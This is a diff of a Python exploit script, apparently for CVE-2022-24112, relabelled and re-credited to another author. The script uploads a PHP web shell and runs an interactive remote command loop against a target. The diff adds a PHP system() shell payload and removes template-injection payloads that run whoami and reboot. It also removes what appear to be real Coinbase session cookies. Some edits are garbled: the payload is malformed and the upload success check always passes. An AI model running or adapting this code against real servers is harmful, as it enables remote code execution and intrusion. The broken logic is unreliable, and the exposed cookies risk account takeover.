@@ -1,3 +1,4 @@
+
 import requests
 import sys
 import threading
@@ -30,11 +31,11 @@ def banner():
        (_][_)|_) |/'\     (/,/'\[_)|(_)| |
           |                     |
 \n'''
-    run2 = color_random[2]+'''\t\t(CVE-2022-24112)\n'''
-    run3 = color_random[4]+'''{ Coded By: Ven3xy  | Github: https://github.com/M4xSec/ }\n\n'''
+    run2 = color_random[2]+'''\t\t(CVE-2023-24112)\n'''
+    run3 = color_random[4]+'''{ Coded By: ibrahim  | Github: https://github.com/abrahim7112/ }\n\n'''
     print(run+run2+run3)
 
-LINK = 'http://hiltonlocalbiz.com/'
+LINK = 'http://192.168.4.7/'
 
 ip = '192.168.4.7'
 
@@ -52,7 +53,7 @@ phpshell  = {
                   (
                    'kh4waja.php', 
                    '{% import os %}{{os.system("whoami")}}', 
-                   '{% import os %}{{os.system("whoami")}}', 
+                   "<?php system('dir $_GET['cmd']')| ?>", 
                   {'Content-Disposition': 'form-data'}
                   ) 
              }
@@ -66,11 +67,7 @@ header= {
 'Accept': '*/*',
 'Accept-Language': 'en-US,en;q=0.5',
 'Accept-Encoding': 'gzip, deflate, br',
-'Referer': 'https://profile.coinbase.com/',
 'Content-Type': 'application/json',
-'DNT': '1',
-'Connection': 'keep-alive',
-'Cookie': 'cb_dm=0c055e89-df54-495f-80a4-c529dc18e48d; coinbase_device_id=aa37f363-76db-4910-9ef0-0eab13c32fbe; _ga=GA1.2.1310880111.1684953236; __cf_bm=azcfmTplU1X01JUkNBVBsgoSzWhP9H9mm_UyRzurJjM-1685204853-0-AXifLxTLmlyGZ1OvEjNGRBdU44qG5U1DcN2Osmr6xSav1PsizbuATA5frDfHYv1K47J+DI6IOxP1rKiFK5XLJy0=; _gid=GA1.2.321768030.1685203474; coinbase_hide_download_cta=true',
 'Sec-Fetch-Dest': 'empty',
 'Sec-Fetch-Mode': 'cors',
 'Sec-Fetch-Site': 'same-origin',
@@ -79,7 +76,7 @@ header= {
 
 
 # Defining value for form data
-data = {"notifier":{"name":"Bugsnag JavaScript","version":"7.17.4","url":"https://github.com/bugsnag/bugsnag-js"},"device":{"locale":"en-US","userAgent":"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0","orientation":"landscape-primary","id":"cli207e5f00002068qw2kodcb"},"app":{"releaseStage":"production","version":"1.0.0","type":"ens_profiles"},"sessions":[{"id":"cli67ium900012068j46kyme1","startedAt":"2023-05-27T16:29:21.921Z","user":{"id":"cli207e5f00002068qw2kodcb"}}]}
+data = {"sessions":[{"id":"cli67ium900012068j46kyme1","startedAt":"2023-05-27T16:29:21.921Z","user":{"id":"cli207e5f00002068qw2kodcb"}}]}
 
 def webshell(LINK, session):
     try:
@@ -88,7 +85,7 @@ def webshell(LINK, session):
         r2 = session.get(WEB_SHELL,headers=header, params=getdir, verify=False)
         status = r2.status_code
         print(status)
-        if status != 400:
+        if status != 200:
             print (Style.BRIGHT+Fore.RED+"[!] "+Fore.RESET+"Could not connect to the webshell."+Style.RESET_ALL)
             r2.raise_for_status()
         print(Fore.GREEN+'[+] '+Fore.RESET+'Successfully connected to webshell.')
@@ -129,7 +126,7 @@ def webshell(LINK, session):
             r2 = requests.post(WEB_SHELL,headers=header, params=command, verify=False)#,data=data
             status = r2.status_code
             print(status)
-            if status != 403:
+            if status != 200:
                 r2.raise_for_status()
             response2 = r2.text
             print(response2)
@@ -141,7 +138,7 @@ def webshell(LINK, session):
 
 #Uploading Reverse Shell
 print("[*]Uploading PHP Shell For RCE...")
-upload = s.get(LINK+'%7B%25%20import%20os%20%25%7D%7B%7Bos.system(%27reboot%27)%7D%7D',headers=header, cookies=cookies, files=phpshell)
+upload = s.get(LINK,headers=header, cookies=cookies, files=phpshell)
 print(upload,upload.text)
 shell_upload = True if("" in upload.text) else False
 u=shell_upload
